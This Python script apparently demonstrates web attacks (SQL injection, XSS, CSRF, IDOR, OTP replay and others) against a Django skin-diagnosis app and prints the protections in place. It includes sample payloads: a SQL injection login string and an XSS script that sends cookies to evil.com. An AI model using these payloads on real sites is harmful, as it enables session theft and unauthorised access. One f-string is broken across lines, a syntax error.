"""
====================================================================
  Secure Skin AI — Security Attack Demonstration & Protection Guide
====================================================================
Run with:  python security_demo.py
====================================================================
"""

import os, sys, time, hashlib, base64, hmac, re, html, json
from datetime import datetime
sys.stdout.reconfigure(encoding='utf-8')

# ─── ANSI colours ────────────────────────────────────────────────
R  = "\033[91m";  G  = "\033[92m";  Y  = "\033[93m"
B  = "\033[94m";  M  = "\033[95m";  C  = "\033[96m"
W  = "\033[97m";  DIM = "\033[2m";  BOLD = "\033[1m";  RST = "\033[0m"

def banner(text, colour=C):
    w = 70
    print(f"\n{colour}{BOLD}{'═'*w}")
    print(f"  {text}")
    print(f"{'═'*w}{RST}")

def section(title, colour=Y):
    print(f"\n{colour}{BOLD}{'─'*60}")
    print(f"  {title}")
    print(f"{'─'*60}{RST}")

def react(text):   print(f"  {R}⚡ SITE REACTS  : {text}{RST}")
def attack(text):  print(f"  {M}☠  ATTACK       : {text}{RST}")
def protect(text): print(f"  {G}🛡  PROTECTION   : {text}{RST}")
def demo(text):    print(f"  {DIM}{text}{RST}")

banner("SECURE SKIN AI — COMPLETE SECURITY ANALYSIS", B)
print(f"""
  {W}This script demonstrates:
  1. Each class of web / network attack
  2. How the UNPROTECTED site would react
  3. Protection already applied / to be applied{RST}
""")

# ══════════════════════════════════════════════════════════════════
# 1. SQL INJECTION
# ══════════════════════════════════════════════════════════════════
section("1. SQL INJECTION", M)

attack("Attacker enters:  ' OR '1'='1  in the username field")
demo("POST /login/  username=' OR '1'='1 --&password=anything")

print(f"\n  {R}[BEFORE PROTECTION]{RST}")
react("If raw SQL were used → all rows returned → attacker logs in as first user!")

print(f"\n  {G}[WITH DJANGO ORM — ALREADY PROTECTED]{RST}")
protect("Django's ORM uses parameterised queries → SQL injection is impossible")
protect("User.objects.get(username=username) → never interpolates raw strings into SQL")

# Proof
payload = "' OR '1'='1"
safe_query = f"SELECT * FROM auth_user WHERE username = %s"
demo(f"  Safe query: {safe_query}")
demo(f"  Bound value: ('{payload}',)  — literal string, not SQL code")
print(f"  {G}✅ Result: query returns 0 rows for this payload — login denied{RST}")


# ══════════════════════════════════════════════════════════════════
# 2. XSS — CROSS-SITE SCRIPTING
# ══════════════════════════════════════════════════════════════════
section("2. XSS — Cross-Site Scripting", M)

xss_payload = "<script>document.cookie='stolen='+document.cookie; fetch('http://evil.com?c='+document.cookie);</script>"
attack(f"Attacker injects: {xss_payload[:60]}…")

print(f"\n  {R}[BEFORE PROTECTION]{RST}")
react("Payload rendered as raw HTML → every visitor's session cookie stolen!")

print(f"\n  {G}[WITH DJANGO AUTO-ESCAPING — ALREADY PROTECTED]{RST}")
protect("Django templates escape {{ variable }} automatically")
escaped = html.escape(xss_payload)
demo(f"  Rendered as: {escaped[:80]}…")
protect("No <script> executes — attacker sees their own text back, nothing more")
protect("CSP header (Content-Security-Policy) adds extra browser-level block")


# ══════════════════════════════════════════════════════════════════
# 3. CSRF — CROSS-SITE REQUEST FORGERY
# ══════════════════════════════════════════════════════════════════
section("3. CSRF — Cross-Site Request Forgery", M)

attack("Evil site silently POSTs to /make-payment/<id>/ while victim is logged in")
demo("  <form action='https://skinai.com/make-payment/5/' method='POST'><input type='hidden' name='amount' value='999'></form>")

print(f"\n  {R}[BEFORE PROTECTION]{RST}")
react("Browser sends session cookie → server thinks it's the real user → payment triggered!")

print(f"
  {G}[WITH csrf_token tag — ALREADY PROTECTED]{RST}")
protect("Every POST form includes a random CSRF token tied to the session")
protect("Django's CsrfViewMiddleware rejects any POST missing a valid token")
demo("  403 Forbidden — CSRF token missing or incorrect")


# ══════════════════════════════════════════════════════════════════
# 4. BRUTE-FORCE / CREDENTIAL STUFFING
# ══════════════════════════════════════════════════════════════════
section("4. Brute-Force / Credential Stuffing", M)

attack("Attacker scripts thousands of login attempts per minute with password lists")

print(f"\n  {R}[BEFORE PROTECTION]{RST}")
react("No rate limiting → attacker can try 100 000 passwords without any delay")

print(f"\n  {G}[PROTECTION: OTP 2FA — ALREADY IMPLEMENTED]{RST}")
protect("Even if password is guessed, attacker needs the OTP sent to user's email")
protect("OTP expires in 120 seconds — extremely short window")
protect("Add django-axes or django-ratelimit for IP-based lockout (recommended)")
demo("  pip install django-axes  →  add 'axes' to INSTALLED_APPS")
demo("  AXES_FAILURE_LIMIT = 5  AXES_COOLOFF_TIME = 1  (hour)")


# ══════════════════════════════════════════════════════════════════
# 5. SESSION HIJACKING
# ══════════════════════════════════════════════════════════════════
section("5. Session Hijacking", M)

attack("Attacker sniffs session cookie over HTTP and replays it")

print(f"\n  {R}[BEFORE PROTECTION]{RST}")
react("Without HTTPS, cookie visible in plaintext on same network — attacker impersonates user")

print(f"\n  {G}[PROTECTION APPLIED IN settings.py]{RST}")
protect("SESSION_COOKIE_HTTPONLY = True  → JS cannot read the cookie")
protect("SESSION_EXPIRE_AT_BROWSER_CLOSE = True  → no persistent session")
protect("SESSION_COOKIE_AGE = 3600  → auto-expire after 1 hour")
protect("Deploy on HTTPS + set SESSION_COOKIE_SECURE = True in production")
protect("SECURE_SSL_REDIRECT = True in production — all HTTP → HTTPS")


# ══════════════════════════════════════════════════════════════════
# 6. MAN-IN-THE-MIDDLE (MITM)
# ══════════════════════════════════════════════════════════════════
section("6. Man-in-the-Middle (MITM)", M)

attack("Attacker intercepts encrypted_image bytes during upload")

print(f"\n  {R}[BEFORE PROTECTION]{RST}")
react("Without hybrid encryption: raw image travels in plaintext → stolen!")

print(f"\n  {G}[HYBRID ENCRYPTION — ALREADY IMPLEMENTED]{RST}")
protect("Step 1 — SHA-256 hash of raw image computed BEFORE encryption")
protect("Step 2 — AES-256 (Fernet) key generated fresh per upload")
protect("Step 3 — Image encrypted with AES key")
protect("Step 4 — AES key encrypted with DOCTOR's RSA-2048 public key (OAEP)")
protect("Even if attacker intercepts the ciphertext, they cannot decrypt without the private key")

# Live mini-demo of encryption proof
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes

sample_data = b"Patient image bytes (simulated)"
aes_key = Fernet.generate_key()
cipher  = Fernet(aes_key)
enc     = cipher.encrypt(sample_data)
hsh     = hashlib.sha256(sample_data).hexdigest()

print(f"\n  {C}[ LIVE ENCRYPTION PROOF ]{RST}")
demo(f"  Original : {sample_data}")
demo(f"  SHA-256  : {hsh}")
demo(f"  AES-256  : {enc[:60].decode()}… (truncated)")
demo(f"  Only holder of private RSA key can recover AES key → decrypt image")


# ══════════════════════════════════════════════════════════════════
# 7. IMAGE TAMPERING / DATA INTEGRITY ATTACK
# ══════════════════════════════════════════════════════════════════
section("7. Image Tampering / Data Integrity Attack", M)

attack("Attacker modifies the encrypted_image bytes in the database")

print(f"\n  {R}[BEFORE PROTECTION]{RST}")
react("Without integrity check: corrupted image silently used for diagnosis — dangerous!")

print(f"\n  {G}[SHA-256 HASH + DIGITAL SIGNATURE — ALREADY IMPLEMENTED]{RST}")
protect("On upload: SHA-256 hash of RAW image stored in image_hash field")
protect("On verify: hash recomputed after decryption → compared with stored hash")
protect("Patient signs image with their RSA private key → signature stored")
protect("Doctor verifies signature with patient's public key → proves authenticity")

original   = b"Real skin image data"
tampered   = b"Real skin image data TAMPERED"
h_orig     = hashlib.sha256(original).hexdigest()
h_tamper   = hashlib.sha256(tampered).hexdigest()
demo(f"\n  Original hash  : {h_orig}")
demo(f"  Tampered hash  : {h_tamper}")
demo(f"  Match? {h_orig == h_tamper}  →  tampering DETECTED immediately")


# ══════════════════════════════════════════════════════════════════
# 8. INSECURE DIRECT OBJECT REFERENCE (IDOR)
# ══════════════════════════════════════════════════════════════════
section("8. IDOR — Insecure Direct Object Reference", M)

attack("Patient A tries: GET /view-report/5/  (report belongs to Patient B)")

print(f"\n  {R}[BEFORE PROTECTION]{RST}")
react("If no ownership check → Patient A reads Patient B's private medical report!")

print(f"\n  {G}[ACCESS CONTROL — ALREADY IMPLEMENTED]{RST}")
protect("view_report checks: request.user == patient OR assigned_doctor OR admin")
protect("download_report uses: get_object_or_404(Report, id=id, image__user=request.user)")
protect("Unauthorized access returns HTTP 403 Forbidden")


# ══════════════════════════════════════════════════════════════════
# 9. REPLAY ATTACK
# ══════════════════════════════════════════════════════════════════
section("9. OTP Replay Attack", M)

attack("Attacker intercepts OTP from email and tries to use it minutes later")

print(f"\n  {R}[BEFORE PROTECTION]{RST}")
react("If OTP has no expiry → attacker can reuse any captured OTP indefinitely!")

print(f"\n  {G}[TIME-BASED OTP EXPIRY — ALREADY IMPLEMENTED]{RST}")
protect("OTP expires after exactly 120 seconds (check in verify_otp())")
protect("otp_purpose stored in session → wrong-purpose OTP rejected")
protect("Session key cleared immediately after successful verification")
demo("  Captured OTP at T+0, attempt at T+130 → 'OTP expired' error")


# ══════════════════════════════════════════════════════════════════
# 10. PAYMENT BYPASS
# ══════════════════════════════════════════════════════════════════
section("10. Payment Bypass", M)

attack("Patient directly visits /download-report/3/ without paying")

print(f"\n  {R}[BEFORE PROTECTION]{RST}")
react("Without check → free PDF download, revenue lost")

print(f"\n  {G}[PAYMENT GATE — ALREADY IMPLEMENTED]{RST}")
protect("download_report checks: if severity=='mild' and not report.is_paid → redirect to payment")
protect("is_paid flag set server-side only — cannot be spoofed via URL manipulation")
protect("Severe cases are free by design (urgent medical need)")


# ══════════════════════════════════════════════════════════════════
# 11. PRIVATE KEY EXPOSURE
# ══════════════════════════════════════════════════════════════════
section("11. Private Key Exposure", M)

attack("Attacker reads Django DEBUG page or error logs containing private key PEM")

print(f"\n  {R}[BEFORE PROTECTION]{RST}")
react("If DEBUG=True in production → full traceback with local variables shown publicly!")

print(f"\n  {G}[PROTECTION STEPS]{RST}")
protect("Set DEBUG = False in production settings")
protect("Use environment variables for SECRET_KEY, EMAIL_HOST_PASSWORD")
protect("Private keys stored in UserProfile DB — never logged or printed in views")
protect("Use .env file + python-decouple or django-environ (never commit .env to git)")


# ══════════════════════════════════════════════════════════════════
# SUMMARY TABLE
# ══════════════════════════════════════════════════════════════════
banner("PROTECTION STATUS SUMMARY", G)

attacks = [
    ("SQL Injection",            "Django ORM (parameterised queries)",    "✅ Protected"),
    ("XSS",                      "Django auto-escaping",                   "✅ Protected"),
    ("CSRF",                     "csrf_token tag on all forms",              "✅ Protected"),
    ("Brute Force",              "OTP 2FA (120s expiry)",                  "✅ Protected"),
    ("Session Hijacking",        "HttpOnly, short session, HTTPS (prod)",  "⚠  Partial*"),
    ("MITM",                     "AES-256 + RSA-2048 hybrid encryption",   "✅ Protected"),
    ("Image Tampering",          "SHA-256 hash + RSA digital signature",   "✅ Protected"),
    ("IDOR",                     "Object-level ownership checks",          "✅ Protected"),
    ("OTP Replay",               "120s time window, purpose lock",         "✅ Protected"),
    ("Payment Bypass",           "Server-side is_paid flag + gate check",  "✅ Protected"),
    ("Private Key Exposure",     "DEBUG off in prod, env vars",            "⚠  Partial*"),
]

col = [38, 40, 16]
hdr = f"{'Attack':<{col[0]}} {'Protection':<{col[1]}} {'Status':<{col[2]}}"
print(f"\n  {BOLD}{W}{hdr}{RST}")
print(f"  {'─'*98}")
for name, prot, status in attacks:
    colour = G if "✅" in status else Y
    print(f"  {W}{name:<{col[0]}}{RST} {DIM}{prot:<{col[1]}}{RST} {colour}{status}{RST}")

print(f"\n  {Y}* Partial = requires HTTPS deployment on Render (set env vars){RST}")
print(f"\n  {DIM}Run python security_demo.py anytime to review your security posture.{RST}\n")
